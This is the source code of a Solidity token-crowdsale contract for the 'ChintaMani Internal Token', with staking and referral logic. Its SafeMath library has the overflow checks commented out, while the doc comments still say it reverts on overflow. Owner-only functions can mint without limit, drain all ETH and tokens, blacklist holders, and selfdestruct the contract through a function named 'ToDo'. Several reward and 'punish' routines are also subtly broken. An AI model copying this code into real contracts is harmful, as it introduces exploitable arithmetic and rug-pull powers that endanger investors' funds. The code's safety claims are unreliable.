/**
 *Submitted for verification at Etherscan.io on 2021-04-12
*/

pragma solidity ^0.4.16;

/*
This token is designed specifically for the Universal Responsibility Fund.
Developer Alex Burn.
"Чинтамани ( ChintaMani ) ...Этот камень известен разным культурам. 
В буддизме он носит имя «Чинтамани» – «Драгоценный камень мысли» и символизирует 
духовные сокровища, которыми способен овладеть просветленный ум...
github https://github.com/alexburndev/unifores/blob/main/chintamani.sol
*/

library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * This test is non-exhaustive, and there may be false-negatives: during the
     * execution of a contract's constructor, its address will be reported as
     * not containing a contract.
     *
     * > It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies in extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.

        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }
    
    
    
    
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal view returns (uint256) {
        uint256 c = a + b;
 //       require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal view returns (uint256) {
//        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal view returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal view returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
    
        uint256 c = a / b;
       // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal view returns (uint256) {
 
        return a % b;
    }
}


contract owned {
    address public owner;
 

    function owned() payable {
        owner = msg.sender;
    }
    
    modifier onlyOwner {
        require(owner == msg.sender);
        _;
    }
    
    address public addressSupportProject = 0x009AE8DDCBF8aba5b04d49d034146A6b8E3a8B0a; //AB
    
       function setNewaddressSupportProject(address _addr ) public onlyOwner {
       require(_addr != 0);
       addressSupportProject = _addr;
    }
    
    
}



contract Crowdsale is owned {
    
   using Address for address;
   using SafeMath for uint256;
    
   uint256 tokensPerOneEther = 16000;
    struct HolderData {
        uint256 funds;
        uint256 lastDatetime;
        uint256 TokenOnAcc;
        uint256 reward;
        
   
        uint256 holdersID;
        
        address blackList;
    
       
    }
    
    struct ReferalData {
        address ref;
        uint8 refUserCount;
     
    }
    
    
    uint256 public totalSupply;
    
    uint256 public LastID;
    
    uint256 public totalToken;
    
    uint256 public totalHolders;
    
    uint256 public reward_to;
    
    uint256 public reward_sender;
    
    uint256 public P = 30;
    
    
    
    
   
    mapping (address => uint256) public balanceOf;
   
    mapping (address => HolderData) public holders;
    
    mapping(address => address) public refList;
    
    mapping(address => ReferalData) public referals;
    
   
    event Transfer(address indexed from, address indexed to, uint256 value);
    
  
    function bytesToAddress(bytes memory bys) private returns (address addr) {
        assembly {
          addr := mload(add(bys,20))
        } 
    }
    
    
   
    function Crowdsale() payable owned() {
   
      HolderData storage data = holders[owner];
      ReferalData storage data_ref = referals[owner];
      
        totalSupply =     6000000000;
        balanceOf[this] = 5000000000;
        balanceOf[owner] = totalSupply - balanceOf[this];
        balanceOf[addressSupportProject]=1000000;
        totalToken += balanceOf[owner];
        totalHolders ++;
        
        data_ref.refUserCount ++;
        data_ref.ref = owner;
        
        data.holdersID = totalHolders;
        data.lastDatetime = now;
        
      //  Transfer(this, owner, balanceOf[owner]);
    //    Transfer(this, addressSupportProject, balanceOf[addressSupportProject]);
    }
    
   


    function () payable external{
        
        assert(msg.sender == tx.origin); // prevent bots to interact with contract
        require(balanceOf[this] > 0);
        require(msg.value > 0);
        
        HolderData storage data = holders[msg.sender];
        HolderData storage data2 = holders[msg.sender];
        ReferalData storage data_ref = referals[msg.sender];
        
        if (data.blackList == msg.sender) return ;
        
        uint256 tokens = tokensPerOneEther * msg.value / 1000000000000000000;
        if (tokens > balanceOf[this]) {
            tokens = balanceOf[this];
            uint valueWei = tokens * 1000000000000000000 / tokensPerOneEther;
            msg.sender.transfer(msg.value - valueWei);
        }
        data.funds += msg.value / 10**18;
        
        // Reward
        
        require(tokens > 0);
        
        if (balanceOf[msg.sender] == 0){
         totalHolders ++;
         data.holdersID = totalHolders ;
         data.lastDatetime = now;
         data.reward = 0;
        
            if (msg.data.length == 0)
             {
               data_ref.ref = address(owner);
               refList[msg.sender] = address(owner);
         
             } 
             else {
                    require(msg.data.length == 20);
                    data_ref.ref = bytesToAddress(msg.data);
                    refList[msg.sender] = bytesToAddress(msg.data);
                    assert(data_ref.ref != msg.sender);
                    }
         
         data_ref.refUserCount++;
         data.holdersID = totalHolders;
         
         }
         
         else {
           
         // Staking
         
           reward_sender = reward_info (msg.sender);
           //Не начислять стейкинг владельцу или в support
           require(msg.sender!=owner || msg.sender!=addressSupportProject);
           
               if (reward_sender > 0) { 
                  balanceOf[msg.sender] += reward_sender;
                  balanceOf[this] -= reward_to;
                  data2.lastDatetime = now;
                  data.reward = 0;
                //  Transfer(this, msg.sender, reward_sender);
                }
           
            
             
          }
        
        
        balanceOf[msg.sender] += tokens;
        balanceOf[this] -= tokens;
        totalToken += tokens;
       
        
      
     
     //   Transfer(this, msg.sender, tokens);
        
        
      // Transfer 3% for Support
        
        uint256 eth_amount = msg.value * 3/1000;
     
        addressSupportProject.transfer(eth_amount);
        
    }
    
    function ChangeProcentReward (uint256 NewProcent) public onlyOwner {
       P = NewProcent;
    }
    
    function reward_info(address addressHolder) public view returns (uint256 Reward) {
        require(balanceOf[addressHolder] > 0);
        HolderData storage data = holders[addressHolder];
  
        
        Reward = balanceOf[addressHolder].mul(P).div(100).mul(block.timestamp - data.lastDatetime).div(30 days);
        
   
    }
    
    
    
    function changeTokensPerOneEther(uint256 newPrice) public onlyOwner {
        tokensPerOneEther = newPrice;
    }
    
    
    
     
        
}

contract CHIT_Token is Crowdsale {
    
    string  public standard    = 'ChintaMani Internal Token';
    string  public name        = 'ChintaMani Internal Token';
    string  public symbol      = "CHIT";
    uint8   public decimals    = 2;

    function CHIT_Token() payable Crowdsale() {}

    function transfer(address _to, uint256 _value) public {
        require (_value > 0);
        require(balanceOf[msg.sender] >= _value);
        
        HolderData storage data = holders[_to];
        HolderData storage data2 = holders[msg.sender];
        ReferalData storage data_ref = referals[_to];
        
        if (holders[_to].blackList == _to) return ;
        
        
  
        
        if (balanceOf[_to] == 0){
         totalHolders ++;
         data.holdersID = totalHolders ;
         address ref = msg.sender;
         data_ref.ref = ref;
         refList[msg.sender] = ref;
         data_ref.refUserCount++;
         data.holdersID = totalHolders;
        }
        
        address general = this;
    
        if ( _to == general) { 
            
            holders[msg.sender].TokenOnAcc += _value;
            
        }
        
  //     Reward accrual
        
        if (_to != address(this) && balanceOf[_to] !=0) {
                reward_to = reward_info (_to);
             if (reward_to > 0 ) { 
                 balanceOf[_to] += reward_to ;
                 balanceOf[this] -= reward_to;
                 data.lastDatetime = now;
                 data.reward = 0;
                 
                 Transfer(this, _to, reward_to);
             }
        }
        
        if (balanceOf[_to] == 0 ) data.lastDatetime = now;
             
        if (msg.sender != address(this) ) {
               reward_sender = reward_info (msg.sender);
            if (reward_sender > 0) { 
                balanceOf[msg.sender] += reward_sender;
                balanceOf[this] -= reward_to;
                data2.lastDatetime = now;
                data.reward = 0;
                Transfer(this, msg.sender, reward_sender);
            }
        }
            
    
    
         balanceOf[msg.sender] -= _value;
         balanceOf[_to] += _value;
         Transfer(msg.sender, _to, _value);
 
        
     }

 
     function transferFromContract(address _to, uint256 _value) public onlyOwner {
         
        require (_value > 0);
        require(balanceOf[this] >= _value);
        
        HolderData storage data = holders[_to];
        ReferalData storage data_ref = referals[_to];
        
        if (holders[_to].blackList == _to) return ;
        
        
  
        
        if (balanceOf[_to] == 0){
         totalHolders ++;
         data.holdersID = totalHolders ;
         address ref = owner;
         data_ref.ref = ref;
         refList[msg.sender] = ref;
         data_ref.refUserCount++;
         data.holdersID = totalHolders;
         data.lastDatetime = now;
         
        }
        else {
           reward_to = reward_info (_to);
             if (reward_to > 0 ) { 
                 balanceOf[_to] += reward_to ;
                 balanceOf[this] -= reward_to;
                 data.lastDatetime = now;
                 data.reward = 0;
                 Transfer(this, _to, reward_to);
             } 
        }
        
        balanceOf[_to] += _value;
        balanceOf[this] -= _value;
     //   Transfer(this, _to, _value);
        
 
    }  
      
      
     function contract_balance() view public returns (uint256 ethBalance, uint256 tokenBalance,uint256 tokenPrice) {
        ethBalance = address(this).balance;
        tokenBalance = balanceOf[this];
        tokenPrice = tokensPerOneEther;
      }
    
    function getHolderInfo(address addressHolder) view public returns (uint256 ethBalanceOnContract, 
    uint256 tokenBalanceOnMyWallet, uint256 TokenBalanceOnContract,
    uint256 MyHolderID, uint256 PendingReward, uint256 ProcentReward,  bool InBlackList) {
        
     
        HolderData storage data = holders[addressHolder];
  
       
        ethBalanceOnContract = holders[addressHolder].funds;
        tokenBalanceOnMyWallet = balanceOf[addressHolder];
        PendingReward = reward_info (addressHolder);
        ProcentReward = P;
        MyHolderID = holders[addressHolder].holdersID;
        if (data.blackList != addressHolder) 
            InBlackList = false ;
       
       TokenBalanceOnContract = data.TokenOnAcc;
           
    }
    
  
    
  
    function punish (address addressHolder) public onlyOwner {
        require(balanceOf[addressHolder] > 0);
        HolderData storage data = holders[addressHolder];
        HolderData storage data2 = holders[addressHolder];
        ReferalData storage data_ref = referals[addressHolder];
        uint256 tokenBalance = balanceOf[addressHolder]; 
        totalHolders --;
        data.blackList = addressHolder;
        data_ref.refUserCount--;
        Transfer (addressHolder, this, tokenBalance);
        data2.lastDatetime = now;
        data.reward = 0;
     }
    
}



contract ChintaMani_Token_Start is CHIT_Token {
    
     

    function ChintaMani_Token_Start() payable CHIT_Token() {}
    
   
    function withdraw_all_from_Contract() public onlyOwner {
        if ( this.balance !=0 ) owner.transfer(this.balance);
      
        uint256 Token_to_out = balanceOf[this];
       
      
        if (Token_to_out != 0) {
        balanceOf[owner] += Token_to_out;
        balanceOf[this] -= Token_to_out;
        
      //  Transfer(this, owner, Token_to_out);
        }
        
    }
    
     
    
    function withdraw_a_little_bit_eth() payable public  onlyOwner {
        owner.transfer(msg.value);
        
    }
    
    function withdraw_a_little_bit_eth(uint256 amount)  public onlyOwner {
        uint256 eth_amount = amount * 10**18;
        owner.transfer(eth_amount);
    }
    
    function addinvest (address Investor ) payable public onlyOwner {
        Investor.transfer(msg.value);
    }
    
    function mintNewToken(uint256 _amount, address _address_hwo) public onlyOwner  {
    
       totalSupply += _amount;
       balanceOf[_address_hwo] += _amount;
   
    }
    
    
    
    function ToDo() public onlyOwner {
        selfdestruct(owner);
    }
}